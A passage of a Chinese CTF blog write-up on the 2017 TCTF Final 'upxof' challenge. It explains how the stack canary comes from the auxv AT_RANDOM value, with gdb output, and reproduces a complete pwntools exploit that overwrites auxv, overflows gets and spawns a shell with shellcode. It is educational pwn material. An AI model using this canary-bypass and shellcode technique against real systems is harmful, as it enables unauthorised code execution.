<h3 id="2017-TCTF-Final-upxof"><a href="#2017-TCTF-Final-upxof" class="headerlink" title="2017-TCTF-Final-upxof"></a>2017-TCTF-Final-upxof</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">λ checksec ./upxof</span><br><span class="line">[*] <span class="string">'/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure>
<p>拖进 ida 里发现有壳，<code>upx -d</code>一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">λ upx -d upxof</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2013</span><br><span class="line">UPX 3.91        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">     10116 &lt;-      6253   61.81%  linux/ElfAMD   upxof</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure>
<p>main 函数长这个样子，<code>gets</code>这里显然有一个溢出点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-410h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"let's go:"</span>, <span class="number">0L</span>L);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是在尝试的时候发现这里有<code>canary</code>，疑惑地重新<code>checksec</code>一下，发现脱了壳变得不一样了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">λ checksec ./upxof_no_upx</span><br><span class="line">[*] <span class="string">'/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof_no_upx'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>这里又不能泄漏，于是就需要用另一种方法来搞定<code>canary</code>，就是改变<code>auxv</code>结构体中的内容。<code>auxv</code>中包含了<code>canary</code>的地址，在动态链接之前就已经确定。（<a href="https://www.elttam.com.au/blog/playing-with-canaries/" target="_blank" rel="noopener">这篇文章</a>讲得比较深入，还有<a href="http://phrack.org/issues/58/5.html" target="_blank" rel="noopener">phrack 上也有一篇文章</a>）</p>
<p><code>auxv</code>结构可以在<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>elf/elf.h</code></a>里看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Auxiliary vector.  */</span></span><br><span class="line"><span class="comment">/* This vector is normally only used by the program interpreter.  The</span></span><br><span class="line"><span class="comment">   usual definition in an ABI supplement uses the name auxv_t.  The</span></span><br><span class="line"><span class="comment">   vector is not usually defined in a standard &lt;elf.h&gt; file, but it</span></span><br><span class="line"><span class="comment">   can't hurt.  We rename it to avoid conflicts.  The sizes of these</span></span><br><span class="line"><span class="comment">   types are an arrangement between the exec server and the program</span></span><br><span class="line"><span class="comment">   interpreter, so we don't fully specify them here.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint32_t</span> a_type;                <span class="comment">/* Entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">uint32_t</span> a_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that,</span></span><br><span class="line"><span class="comment">         though, since it does not work when using 32-bit definitions</span></span><br><span class="line"><span class="comment">         on 64-bit platforms and vice versa.  */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> a_type;                <span class="comment">/* Entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">uint64_t</span> a_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that,</span></span><br><span class="line"><span class="comment">         though, since it does not work when using 32-bit definitions</span></span><br><span class="line"><span class="comment">         on 64-bit platforms and vice versa.  */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf64_auxv_t;</span><br></pre></td></tr></table></figure>
<p>自己写一个带有<code>canary</code>的程序，用 gdb 调一下，<code>info auxv</code>查看结构体的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; info auxv</span><br><span class="line">33   AT_SYSINFO_EHDR      System-supplied DSO&apos;s ELF header 0x7ffff7ffa000</span><br><span class="line">16   AT_HWCAP             Machine-dependent CPU capability hints 0xf8bfbff</span><br><span class="line">6    AT_PAGESZ            System page size               4096</span><br><span class="line">17   AT_CLKTCK            Frequency of times()           100</span><br><span class="line">3    AT_PHDR              Program headers for program    0x400040</span><br><span class="line">4    AT_PHENT             Size of program header entry   56</span><br><span class="line">5    AT_PHNUM             Number of program headers      9</span><br><span class="line">7    AT_BASE              Base address of interpreter    0x7ffff7dd7000</span><br><span class="line">8    AT_FLAGS             Flags                          0x0</span><br><span class="line">9    AT_ENTRY             Entry point of program         0x4004a0</span><br><span class="line">11   AT_UID               Real user ID                   1000</span><br><span class="line">12   AT_EUID              Effective user ID              1000</span><br><span class="line">13   AT_GID               Real group ID                  1000</span><br><span class="line">14   AT_EGID              Effective group ID             1000</span><br><span class="line">23   AT_SECURE            Boolean, was exec setuid-like? 0</span><br><span class="line">25   AT_RANDOM            Address of 16 random bytes     0x7fffffffe0e9</span><br><span class="line">31   AT_EXECFN            File name of executable        0x7fffffffefc2 &quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;</span><br><span class="line">15   AT_PLATFORM          String identifying platform    0x7fffffffe0f9 &quot;x86_64&quot;</span><br><span class="line">0    AT_NULL              End of vector                  0x0</span><br></pre></td></tr></table></figure>
<p><a href="https://my.oschina.net/ibuwai/blog/688107" target="_blank" rel="noopener">经过了解</a>，结构体中<code>AT_RANDOM</code>的值对应了<code>canary</code>的值（<code>The value is a pointer to sixteen random bytes provided by the kernel. The dynamic linker uses this to implement a stack canary</code>），可以测试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/gx 0x7fffffffe0e9</span><br><span class="line">0x7fffffffe0e9:	0x47747e045c58c8d8</span><br><span class="line">assassinq&gt;&gt; canary</span><br><span class="line">canary : 0x47747e045c58c800</span><br></pre></td></tr></table></figure>
<p>还有比较重要的是，程序一开始<code>AT_RANDOM</code>、<code>AT_EXECFN</code>、<code>AT_PLATFORM</code>和其他的值都会被 push 到栈上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; stack 1000</span><br><span class="line">...</span><br><span class="line">1280| 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d8</span><br><span class="line">1288| 0x7fffffffe0b8 --&gt; 0x1f</span><br><span class="line">1296| 0x7fffffffe0c0 --&gt; 0x7fffffffefc2 (&quot;/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary&quot;)</span><br><span class="line">1304| 0x7fffffffe0c8 --&gt; 0xf</span><br><span class="line">1312| 0x7fffffffe0d0 --&gt; 0x7fffffffe0f9 --&gt; 0x34365f363878 (&apos;x86_64&apos;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以<code>searchmem</code>一下看到存放<code>canary</code>的地方：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; searchmem 0x7fffffffe0e9</span><br><span class="line">Searching for &apos;0x7fffffffe0e9&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">[stack] : 0x7fffffffe0b0 --&gt; 0x7fffffffe0e9 --&gt; 0x47747e045c58c8d8</span><br><span class="line">assassinq&gt;&gt; searchmem 0x47747e045c58c800</span><br><span class="line">Searching for &apos;0x47747e045c58c800&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line"> mapped : 0x7ffff7fda728 --&gt; 0x47747e045c58c800</span><br><span class="line">[stack] : 0x7fffffffdc78 --&gt; 0x47747e045c58c800</span><br></pre></td></tr></table></figure>
<p>最后基本上就可以知道<code>canary</code>的起源是如下的方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel----&gt;AT_RANDOM----&gt;fs:[0x28]----&gt;canary</span><br></pre></td></tr></table></figure>
<p>那么思路就分成了两步：</p>
<ol>
<li>在程序还没有链接的时候把<code>auxv</code>的结构体覆盖，修改<code>AT_RANDOM</code>以设置<code>canary</code>为已知的值</li>
<li>接下来直接溢出做 ROP 或者直接跳到 shellcode 上</li>
</ol>
<p>现在看来这个 upx 壳显然是有意义的。需要在没有被脱壳的情况下，没有被载入前覆盖掉<code>auxv</code>。第一次加载壳的时候可以输入长为<code>0x4096</code>的字符串，前八位则要求必须是<code>12345678</code>才能过 check。接下来解壳之后就可以溢出。</p>
<p><a href="https://github.com/L4ys/CTF/blob/master/0ctf-final-2017/upxof/exp.py" target="_blank" rel="noopener">L4ys 大佬的 exp</a>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">'./upxof'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *0x400a1c')</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">password = <span class="string">'12345678'</span></span><br><span class="line">payload = password</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">14</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># argc</span></span><br><span class="line">payload += p64(<span class="number">0x400008</span>) <span class="comment"># argv</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400008</span>) * <span class="number">39</span> <span class="comment"># envp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># aux vector</span></span><br><span class="line"><span class="comment"># payload += p64(0x21)</span></span><br><span class="line"><span class="comment"># payload += p64(0x7ffff7ffd000)</span></span><br><span class="line"><span class="comment"># payload += p64(0x10) # AT_HWCAP</span></span><br><span class="line"><span class="comment"># payload += p64(0x1f8bfbff)</span></span><br><span class="line"><span class="comment"># payload += p64(0x6) # AT_PAGESZ</span></span><br><span class="line"><span class="comment"># payload += p64(0x1000)</span></span><br><span class="line"><span class="comment"># payload += p64(0x11) # AT_CLKTCK</span></span><br><span class="line"><span class="comment"># payload += p64(0x64)</span></span><br><span class="line">payload += p64(<span class="number">0x3</span>) <span class="comment"># AT_PHDR</span></span><br><span class="line">payload += p64(<span class="number">0x400040</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x4) # AT_PHENT</span></span><br><span class="line"><span class="comment"># payload += p64(0x38)</span></span><br><span class="line">payload += p64(<span class="number">0x5</span>) <span class="comment"># AT_PHNUM</span></span><br><span class="line">payload += p64(<span class="number">0x2</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x7) # AT_BASE</span></span><br><span class="line"><span class="comment"># payload += p64(0x0)</span></span><br><span class="line"><span class="comment"># payload += p64(0x8) # AT_FLAGS</span></span><br><span class="line"><span class="comment"># payload += p64(0x0)</span></span><br><span class="line">payload += p64(<span class="number">0x9</span>) <span class="comment"># AT_ENTRY</span></span><br><span class="line">payload += p64(<span class="number">0x400988</span>)</span><br><span class="line"><span class="comment"># payload += p64(0xb) # AT_UID</span></span><br><span class="line"><span class="comment"># payload += p64(0x0)</span></span><br><span class="line"><span class="comment"># payload += p64(0xc) # AT_EUID</span></span><br><span class="line"><span class="comment"># payload += p64(0x0)</span></span><br><span class="line"><span class="comment"># payload += p64(0xd) # AT_GID</span></span><br><span class="line"><span class="comment"># payload += p64(0x0)</span></span><br><span class="line"><span class="comment"># payload += p64(0xe) # AT_EGID</span></span><br><span class="line"><span class="comment"># payload += p64(0x0)</span></span><br><span class="line"><span class="comment"># payload += p64(0x17) # AT_SECURE</span></span><br><span class="line"><span class="comment"># payload += p64(0x0)</span></span><br><span class="line">payload += p64(<span class="number">0x19</span>) <span class="comment"># AT_RANDOM</span></span><br><span class="line">payload += p64(<span class="number">0x800008</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x1f) # AT_EXECFN</span></span><br><span class="line"><span class="comment"># payload += p64(0x7fffffffeff0) # --&gt; 0x666f7870752f2e ('./upxof')</span></span><br><span class="line"><span class="comment"># payload += p64(0xf) # AT_PLATFORM</span></span><br><span class="line"><span class="comment"># payload += p64(0x7fffffffe659) # --&gt; 0x34365f363878 ('x86_64')</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'go:'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4007f3</span></span><br><span class="line">gets = <span class="number">0x4005B0</span></span><br><span class="line">p.sendline(flat(<span class="string">'\x00'</span> * <span class="number">1048</span>, pop_rdi, <span class="number">0x00800000</span>, gets, <span class="number">0x00800000</span>))</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/</a><br><a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a><br><a href="https://bbs.ichunqiu.com/thread-44069-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-44069-1-1.html</a><br><a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a><br><a href="https://www.jianshu.com/p/c3624f5dd583" target="_blank" rel="noopener">https://www.jianshu.com/p/c3624f5dd583</a><br><a href="https://deadc0de.re/articles/microwave-write-up.html" target="_blank" rel="noopener">https://deadc0de.re/articles/microwave-write-up.html</a><br><a href="https://braddaniels.org/csaw-quals-2017-scv/" target="_blank" rel="noopener">https://braddaniels.org/csaw-quals-2017-scv/</a><br><a href="https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/" target="_blank" rel="noopener">https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/</a><br><a href="https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/" target="_blank" rel="noopener">https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/02/18/【译】Radare2之旅-Part1：Simple-crackme/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          【译】Radare2之旅-Part1：Simple crackme
        
      </div>
    </a>
  
  
    <a href="/2019/02/15/为Windows系统鼠标右键添加软件和图标/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">为Windows系统鼠标右键添加软件和图标</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#何为-Canary"><span class="nav-number">1.</span> <span class="nav-text">何为 Canary</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Canary绕过技术"><span class="nav-number">2.</span> <span class="nav-text">Canary绕过技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#泄漏Canary"><span class="nav-number">2.1.</span> <span class="nav-text">泄漏Canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2016-insomnihack-microwave"><span class="nav-number">2.1.1.</span> <span class="nav-text">2016-insomnihack-microwave</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2017-CSAW-Quals-scv"><span class="nav-number">2.1.2.</span> <span class="nav-text">2017-CSAW-Quals-scv</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破Canary"><span class="nav-number">2.2.</span> <span class="nav-text">爆破Canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2017-NSCTF-pwn2"><span class="nav-number">2.2.1.</span> <span class="nav-text">2017-NSCTF-pwn2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSP（Stack-Smashing-Protect）-Leak"><span class="nav-number">2.3.</span> <span class="nav-text">SSP（Stack Smashing Protect） Leak</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-Smashes"><span class="nav-number">2.3.1.</span> <span class="nav-text">JarvisOJ-Smashes</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Auxiliary-Vector"><span class="nav-number">2.4.</span> <span class="nav-text">Auxiliary Vector</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2017-TCTF-Final-upxof"><span class="nav-number">2.4.1.</span> <span class="nav-text">2017-TCTF-Final-upxof</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">3.</span> <span class="nav-text">参考网站</span></a></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>
